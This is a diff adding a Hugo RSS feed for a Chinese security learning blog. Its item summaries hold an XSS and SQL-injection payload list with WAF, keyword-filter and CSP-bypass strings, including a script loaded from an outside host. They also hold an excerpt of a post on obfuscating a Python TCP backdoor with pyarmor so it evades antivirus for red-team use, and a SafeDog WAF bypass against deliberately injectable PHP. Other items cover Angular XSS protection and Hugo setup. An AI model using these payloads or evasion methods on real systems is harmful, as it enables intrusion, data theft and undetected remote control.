@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Liod &#39;s Blog</title>
+    <link>/</link>
+    <description>Recent content on Liod &#39;s Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
+    <lastBuildDate>Thu, 25 Apr 2019 21:15:41 +0800</lastBuildDate>
+    
+	<atom:link href="/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Payload记录</title>
+      <link>/posts/payload%E8%AE%B0%E5%BD%95/</link>
+      <pubDate>Thu, 25 Apr 2019 21:15:41 +0800</pubDate>
+      
+      <guid>/posts/payload%E8%AE%B0%E5%BD%95/</guid>
+      <description>记录一些用得到payload xss &amp;gt; 标签黑名单类 &amp;lt;svg%0Ao%00nload=%09((pro\u006dpt))()// &amp;lt;script x&amp;gt;alert(&amp;#39;XSS&amp;#39;)&amp;lt;script y&amp;gt; &amp;gt; 关键字bypass eval(&amp;#39;ale&amp;#39;+&amp;#39;rt(0)&amp;#39;); Function(&amp;#34;ale&amp;#34;+&amp;#34;rt(1)&amp;#34;)(); new Function`al\ert\`6\``; setTimeout(&amp;#39;ale&amp;#39;+&amp;#39;rt(2)&amp;#39;); setInterval(&amp;#39;ale&amp;#39;+&amp;#39;rt(10)&amp;#39;); Set.constructor(&amp;#39;ale&amp;#39;+&amp;#39;rt(13)&amp;#39;)(); Set.constructor`al\x65rt\x2814\x29```; &amp;gt; csp-bypass &amp;lt;script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);&amp;gt;&amp;#34; script=document.createElement(&amp;#39;script&amp;#39;); script.src=&amp;#39;//bo0om.ru/csp.js&amp;#39;; window.frames[0].document.head.appendChild(script); d=document;f=d.createElement(&amp;#34;iframe&amp;#34;);f.src=d.querySelector(&amp;#39;link[href*=&amp;#34;.css&amp;#34;]&amp;#39;).href;d.body.append(f);s=d.createElement(&amp;#34;script&amp;#34;);s.src=&amp;#34;https://yoursubdomain.xss.ht&amp;#34;;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) &amp;lt;object data=&amp;#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;#34;&amp;gt;&amp;lt;/object&amp;gt; &amp;gt; waf-bypass &amp;lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&amp;gt; &amp;lt;a href=javas&amp;amp;#99;ript:alert(1)&amp;gt; &amp;lt;object data=&amp;#39;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;#39;&amp;gt;&amp;lt;/object&amp;gt; ?&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;base%20c%3D=href%3Dhttps:\mysite&amp;gt; 来源: PayloadsAllTheThings
+SQL注入 mysql &amp;gt; union union select id from user where id = &amp;#39;1&amp;#39; and 0x01 union /*!60000*/select 1,2,3 from `mysql0.user` bool SELECT * FROM users WHERE id=&amp;#39;1&amp;#39;=/*!user () regexp 0x5e72*/ -- +  bool SELECT * FROM users WHERE id=&amp;#39;1&amp;#39; and sleep/**/((select @a:=if(user/**/() regexp /*!</description>
+    </item>
+    
+    <item>
+      <title>Hugo&#43;github_pages搭建博客</title>
+      <link>/posts/hugo&#43;github_pages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
+      <pubDate>Thu, 25 Apr 2019 16:26:40 +0800</pubDate>
+      
+      <guid>/posts/hugo&#43;github_pages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
+      <description>前言  Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。
+ 官网 The world’s fastest framework for building websites | Hugo
+相比hexo而言，hugo确实很方便的部署静态网站。而且 too go！ too faster！
+安装 在对应系统平台下载安装包 Releases · gohugoio/hugo · GitHub
+# 生成站点 $ hugo new site /path/to/site $ cd /path/to/site 目录结构如下 ▸ archetypes/ ▸ content/ ▸ layouts/ ▸ static/ config.toml #创建文章 $ hugo new about.md #创建文章放到post目录 $ hugo new post/first.md #安装主题 # 创建 themes 目录 $ cd themes $ git clone https://github.com/spf13/hyde.git $ hugo server --theme=hyde --buildDrafts 浏览器里打开： http://localhost:1313</description>
+    </item>
+    
+    <item>
+      <title>About</title>
+      <link>/about/</link>
+      <pubDate>Wed, 24 Apr 2019 21:48:51 -0700</pubDate>
+      
+      <guid>/about/</guid>
+      <description>  address: 上海 whoami: liod  note：  萌新，记录一下学习记录
+之前文章也是丢丢散散，回过来发现自己什么也没积累，博客记录一下学习的感悟和生活。
+ </description>
+    </item>
+    
+    <item>
+      <title>Friends</title>
+      <link>/friends/</link>
+      <pubDate>Tue, 23 Apr 2019 16:27:58 +0800</pubDate>
+      
+      <guid>/friends/</guid>
+      <description>丁哥</description>
+    </item>
+    
+    <item>
+      <title>有趣的python混淆</title>
+      <link>/posts/%E6%9C%89%E8%B6%A3%E7%9A%84python%E6%B7%B7%E6%B7%86/</link>
+      <pubDate>Thu, 25 Oct 2018 17:06:13 +0800</pubDate>
+      
+      <guid>/posts/%E6%9C%89%E8%B6%A3%E7%9A%84python%E6%B7%B7%E6%B7%86/</guid>
+      <description>一个有趣的python混淆库 pyarmor · PyPI 前几天由于红队要准备一些东西，找不到免杀的远控，一时也没有思路，想到以前有人用shellcode&amp;lt;python&amp;gt; 打包为exe，可以免杀的效果，但是常规shellcode直接打包已经被列入规则库，我想了想从python语言角度上混淆看来下效果，基本常见免杀引擎都可以，满足需求。
+pyarmor打包混淆原理，其收费版本混淆无规则，开源免费版本硬编码。 Pyarmor 加密和保护 Python 源代码的方法和机制 pyarmor/protect-python-scripts-by-pyarmor.md at master · dashingsoft/pyarmor · GitHub
+准备工作 一个python tcp服务端和客户端，利用混淆库 打包成windwos exe。
+server.py (tcp后门例子用的是t00ls的帖子) # -*- coding: utf-8 -*- import socket,subprocess as sp,sys # 导入subprocess，socket模块 # 1）监听信息 host = sys.argv[1] # 攻击者地址，通常留空&amp;#39;&amp;#39; port = int(sys.argv[2]) # 攻击者主机端口 # 2）套接字部分 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字 s.bind((host,port)) # 绑定套接字 s.listen(100) # 最大连接数:100 conn,addr = s.accept() # 接收客户端连接 # 3）输出连接信息 print &amp;#34;[+] Conection Established from: %s&amp;#34; % (str(addr[0])) # 打印攻击者的连接信息 # 4）接收输出 while 1: # 运行死循环初始化反向的连接 command = raw_input(&amp;#34;#&amp;gt; &amp;#34;) # 服务器输入 # 5）if判断-1 if command !</description>
+    </item>
+    
+    <item>
+      <title>Post With Featured Image</title>
+      <link>/posts/post-with-featured-image/</link>
+      <pubDate>Mon, 01 Oct 2018 16:15:09 +0800</pubDate>
+      
+      <guid>/posts/post-with-featured-image/</guid>
+      <description>Just define the image URL in the content’s front matter, the featured image will be displayed as the background.
+For example:
+---images:-https://picsum.photos/1024/768/?random--- This is an array, you can set multiple urls, only the first url will be used. These images is also used in Twitter Cards and the Open Graph metadata.</description>
+    </item>
+    
+    <item>
+      <title>安全狗bypass</title>
+      <link>/posts/%E5%AE%89%E5%85%A8%E7%8B%97/</link>
+      <pubDate>Mon, 25 Jun 2018 14:05:01 +0800</pubDate>
+      
+      <guid>/posts/%E5%AE%89%E5%85%A8%E7%8B%97/</guid>
+      <description>前言 最近在学习waf的绕过,中间遇到不同的坑,后来学习下sqlmap中tamper的写法,膜拜sqlmap的作者, tamper的写法很丰富,也很方便
+安全狗的绕过 自己本地搭建了最新版本的安全狗,利用mysql的内联注释,继续bypass
+环境准备  PHP 5.4.5 Mysql 5.5 Apache 2.2.0  利用替换空白字符&amp;quot; &amp;quot; == &amp;quot;/**!50000xxx**/&amp;quot;的方法 bypass
+注入源码 show.php
+&amp;lt;?php include_once(&amp;#34;./config/config_db.php&amp;#34;); include_once(&amp;#34;./config/db_init.php&amp;#34;); $db = new DB($config); $id = $_GET[&amp;#34;id&amp;#34;]; if (isset($id)){ $sql= &amp;#34;select user_name,email,password from ecs_admin_user where user_id = {$id}&amp;#34;; echo $sql.&amp;#34;&amp;lt;br&amp;gt;&amp;#34;; @$result = $db-&amp;gt;select($sql); if (count($result[0])&amp;gt;1){ echo $result[0][0].&amp;#34; okokok&amp;lt;br&amp;gt;&amp;#34;; echo $result[0][1].&amp;#34;&amp;lt;br&amp;gt;&amp;#34;; echo $result[0][2].&amp;#34;&amp;lt;br&amp;gt;&amp;#34;; }else{ echo &amp;#34;fuck&amp;#34;; } } ?&amp;gt;  本地搭建的环境尝试
+http://192.168.56.101/show.php?id=1/**!5000xxx**/and/**!50000xxx**/1/**!50000xxx**/=1 好了,知道安全狗对关键词之间检测那么我们可以在其空白字符和= ()这些字符之间插入我们这个注释来绕过
+tamper的编写 我们观察sqlmap自带的tamper来观察如何绕过</description>
+    </item>
+    
+    <item>
+      <title>Angular-xss</title>
+      <link>/posts/hello/</link>
+      <pubDate>Thu, 05 Apr 2018 21:49:57 -0700</pubDate>
+      
+      <guid>/posts/hello/</guid>
+      <description>Angular-xss防护  为了系统性的防范 XSS 问题，Angular 默认把所有值都当做不可信任的。 当值从模板中以属性（Property）、DOM 元素属性（Attribte)、CSS 类绑定或插值表达式等途径插入到 DOM 中的时候， Angular 将对这些值进行无害化处理（Sanitize），对不可信的值进行编码。 Angular 定义了四个安全环境 - HTML，样式，URL，和资源 URL：
+  HTML：值需要被解释为 HTML 时使用，比如当绑定到 innerHTML 时。 样式：值需要作为 CSS 绑定到 style 属性时使用。 URL：值需要被用作 URL 属性时使用，比如 &amp;lt;a href&amp;gt;。 资源 URL的值需要作为代码进行加载并执行，比如 &amp;lt;script src&amp;gt; 中的 URL。  Angular 会对前三项中种不可信的值进行无害化处理，但不能对第四种资源 URL 进行无害化，因为它们可能包含任何代码。在开发模式下， 如果在进行无害化处理时需要被迫改变一个值，Angular 就会在控制台上输出一个警告。
+example &amp;lt;h3&amp;gt;Binding innerHTML&amp;lt;/h3&amp;gt; &amp;lt;p&amp;gt;Bound value:&amp;lt;/p&amp;gt; &amp;lt;p class=&amp;#34;e2e-inner-html-interpolated&amp;#34;&amp;gt;{{htmlSnippet}}&amp;lt;/p&amp;gt; &amp;lt;p&amp;gt;Result of binding to innerHTML:&amp;lt;/p&amp;gt; &amp;lt;p class=&amp;#34;e2e-inner-html-bound&amp;#34; [innerHTML]=&amp;#34;htmlSnippet&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;export class InnerHtmlBindingComponent { // For example, a user/attacker-controlled value from a URL.</description>
+    </item>
+    
+    <item>
+      <title>About Hugo</title>
+      <link>/about-hugo/</link>
+      <pubDate>Wed, 09 Apr 2014 00:00:00 +0000</pubDate>
+      
+      <guid>/about-hugo/</guid>
+      <description>Hugo is the world’s fastest framework for building websites. It is written in Go.
+It makes use of a variety of open source projects including:
+ https://github.com/russross/blackfriday https://github.com/alecthomas/chroma https://github.com/muesli/smartcrop https://github.com/spf13/cobra https://github.com/spf13/viper  Learn more and contribute on GitHub.</description>
+    </item>
+    
+  </channel>
+</rss>
